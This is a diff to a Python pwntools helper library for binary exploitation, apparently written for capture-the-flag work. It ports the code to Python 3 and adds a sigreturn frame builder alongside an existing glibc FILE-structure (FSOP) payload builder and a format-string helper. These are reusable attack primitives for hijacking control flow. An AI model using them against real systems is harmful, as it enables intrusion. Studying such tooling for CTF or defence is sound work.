@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 import sys
 import os
 from pwn import *
@@ -19,7 +21,7 @@ class FilePlusStruct:
 		self._vtable = 0
 	
 	def get_payload(self):
-		s = ""
+		s = b""
 		s += p64(self._flags)
 		s += p64(self._IO_read_ptr)
 		s += p64(self._IO_read_end)
@@ -42,16 +44,62 @@ class FilePlusStruct:
 		return s
 	
 	def bypass_fsop(self, rip, rdi, lock, vtable):
-		self._IO_write_ptr = (rdi-100)/2
-		self._IO_buf_end = (rdi-100)/2
+		self._IO_write_ptr = (rdi-100)//2
+		self._IO_buf_end = (rdi-100)//2
 		self._lock = lock
 		self._vtable = vtable
 		return self.get_payload() + p64(rip)
 
-
 def bypass_fsop(rip, rdi, lock, vtable):
 	fileplus = FilePlusStruct()
 	return fileplus.bypass_fsop(rip, rdi, lock, vtable)
+
+class SOP():
+	def __init__(self):
+		self.r8 = 0
+		self.r9 = 0
+		self.r10 = 0
+		self.r11 = 0
+		self.r12 = 0
+		self.r13 = 0
+		self.r14 = 0
+		self.r15 = 0
+		self.rdi = 0
+		self.rsi = 0
+		self.rbp = 0
+		self.rbx = 0
+		self.rdx = 0
+		self.rax = 0
+		self.rcx = 0
+		self.rsp = 0
+		self.rip = 0
+		self.eflags = 0
+		self.cs_gs_fs = 0x33
+	
+	def get_payload(self):
+		s = b""
+		s += p64(0)*5
+		s += p64(self.r8)
+		s += p64(self.r9)
+		s += p64(self.r10) 
+		s += p64(self.r11) 
+		s += p64(self.r12) 
+		s += p64(self.r13) 
+		s += p64(self.r14) 
+		s += p64(self.r15) 
+		s += p64(self.rdi) 
+		s += p64(self.rsi) 
+		s += p64(self.rbp) 
+		s += p64(self.rbx) 
+		s += p64(self.rdx) 
+		s += p64(self.rax) 
+		s += p64(self.rcx) 
+		s += p64(self.rsp) 
+		s += p64(self.rip) 
+		s += p64(self.eflags)
+		s += p64(self.cs_gs_fs)
+		s += p64(0)*7
+		return s
 
 def fsb(width, offset, data, padding, roop):
 	payload = ""
